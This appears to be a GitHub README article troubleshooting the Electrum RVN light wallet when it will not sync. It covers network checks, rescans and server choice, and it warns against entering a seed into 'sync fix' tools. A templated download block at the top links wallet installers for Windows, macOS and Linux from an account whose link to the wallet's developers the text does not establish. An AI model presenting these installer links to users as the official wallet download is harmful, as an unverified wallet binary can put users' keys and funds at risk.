![Electrum RVN](assets/banner-article.png)

# Electrum RVN Not Syncing

<!-- compact-download-block -->

<p align="center">A wallet stuck on a server that stopped answering</p>

<p align="center"><a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F05239?style=for-the-badge&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="Download for macOS"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F05239?style=for-the-badge&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`electrum-rvn-v4.8.0-setup.exe`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-F05239?style=flat-square&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="macOS"> | macOS 12 or later | [`electrum-rvn-v4.8.0.dmg`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg) |
| <img src="https://img.shields.io/badge/Linux-F05239?style=flat-square&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-rvn-v4.8.0.AppImage`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage) |

</div>

All versions and checksums are on the [release page](https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0).

> [!WARNING]
> Only download from this GitHub release page.

<!-- /compact-download-block -->
A wallet that will not sync has no server it can talk to, or something is in the path: a firewall, a VPN, a captive portal, or a clock that is wrong enough to break TLS. The wallet has no chain to download, so "syncing" here means "reaching a server and reading its answers" - which makes the diagnosis narrower than it looks.

## What syncing means in a light client

There is no blockchain to download. On first run the wallet fetches block headers, checks the proof-of-work chain, and asks a server about its addresses. "Not syncing" almost always means one of those steps is failing because the connection is not working.

That is why the fixes are network fixes rather than wallet fixes, and why reinstalling rarely helps.

## The order to check

**1. Is anything connected at all?** The status indicator is the first thing to read. If it shows no connection, nothing else matters yet.

**2. Does the server list load?** If the wallet cannot fetch the server list, the problem is the network path, not the wallet.

**3. Is a VPN or proxy running?** VPNs change routes and can block the ports the wallet uses. Turn it off and retry; if the wallet connects, the VPN is the cause.

**4. Is a captive portal in the way?** Hotel, airport and guest networks intercept connections until you accept their terms. Open a browser, complete the portal, then retry.

**5. Is the clock correct?** TLS certificates are time-sensitive, and a machine whose clock is hours off can fail to connect to every server. Enable automatic time and retry.

**6. Is the firewall blocking it?** A firewall rule that blocks the wallet's outbound connection looks exactly like a dead server.

## After the connection works

If the indicator shows a connection but the balance is wrong or absent:

**Rescan.** The wallet re-queries its addresses instead of trusting a cached view.

**Try a different server.** A server that is behind or answering inconsistently produces a wallet that disagrees with an explorer - [Electrum RVN will not connect to a server](https://github.com/electrum-source/token-and-network/blob/main/electrum-rvn-will-not-connect-to-a-server.md).

**Check which network you are on.** A wallet switched to testnet syncs testnet, and shows nothing of your mainnet history.

**Check which wallet is open.** Several wallet files, several windows - a new empty wallet file syncs perfectly and shows zero.

## What is not the problem

**The blockchain.** It is not downloading, and a slow internet connection does not slow a light client the way it slows a full node.

**Your seed.** A wrong seed does not stop syncing; it produces a valid wallet with no history. That is a different symptom with a different fix - [zero balance after restoring Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/zero-balance-after-restoring-electrum-rvn.md).

**The wallet file's password.** A wrong password means the file will not open, not that syncing fails.

## When a rescan takes a long time

A wallet with a long history re-queries many addresses, which takes longer than a fresh one. That is progress, not a hang. Let it finish before deciding the rescan failed.

If it stalls with no progress on a server that is otherwise connected, switch servers and rescan again. A server that times out mid-rescan is a server problem.

## Servers, briefly

The wallet comes with a list of servers and lets you choose. Public servers vary in responsiveness and in how current their view is. Two rules:

- **Prefer a server that responds quickly and stays connected** rather than the first one in a list.
- **If you run your own node**, point the wallet at it and the question of which public server is honest disappears - [does Electrum RVN need a full node?](https://github.com/electrum-source/download-and-setup/blob/main/does-electrum-rvn-need-a-full-node.md).

## What not to do

**Do not reinstall repeatedly.** A network path problem survives every reinstall.

**Do not disable system security** to force a connection.

**Do not restore a seed** because the wallet will not sync. It will not help, and it puts the words on screen for no reason.

**Do not enter the seed into a "sync fix" tool or site.** There is no such tool - [how safe is Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/how-safe-is-electrum-rvn.md).

## If it works on another network

Connect the laptop to a phone hotspot. If the wallet syncs there, the problem is your network: a router rule, a VPN, a firewall or a captive portal. That single test saves an hour of guessing, and it is the first thing worth trying when the wallet has been working and suddenly stops.

The wallet is actively maintained, and the current release is on the releases page: https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0. [Stuck Ravencoin transaction in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/stuck-ravencoin-transaction-in-electrum-rvn.md) is the different case of a transaction that broadcast but will not confirm, and [Ravencoin privacy with Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/ravencoin-privacy-with-electrum-rvn.md) explains what the server you connect to can see. [Point a mining pool at Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/point-a-mining-pool-at-electrum-rvn.md) is where a missing payout is usually a pool setting rather than a sync fault, and [wrong address sends](https://github.com/electrum-source/token-and-network/blob/main/wrong-address-sends-in-electrum-rvn.md) is the failure that looks like a sync problem because the money simply is not there.

## FAQ

### Why is my wallet not syncing?

Usually no reachable server: a VPN, firewall, captive portal or wrong system clock. The status indicator tells you whether the connection is the problem.

### Does it need to download the blockchain?

No. It downloads headers and asks servers about its addresses. "Syncing" is a short network conversation, not a chain download.

### Can I force it to connect?

You can choose another server and rescan. You cannot force a blocked network path open, which is why the network checks come first.

### Why does it show zero after syncing?

Check the derivation path and which wallet file is open before anything else - a valid wallet with nothing in it is usually looking in the wrong place.

### Is a rescan safe?

Yes. It re-reads the chain for your addresses and changes nothing on it.

<!-- related-articles -->

## Related articles

- [Electrum RVN Will Not Connect to a Server](https://github.com/electrum-source/token-and-network/blob/main/electrum-rvn-will-not-connect-to-a-server.md)
- [Zero Balance After Restoring Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/zero-balance-after-restoring-electrum-rvn.md)
- [Does Electrum RVN Need a Full Node?](https://github.com/electrum-source/download-and-setup/blob/main/does-electrum-rvn-need-a-full-node.md)
- [How Safe Is Electrum RVN?](https://github.com/electrum-source/passphrase-backup/blob/main/how-safe-is-electrum-rvn.md)
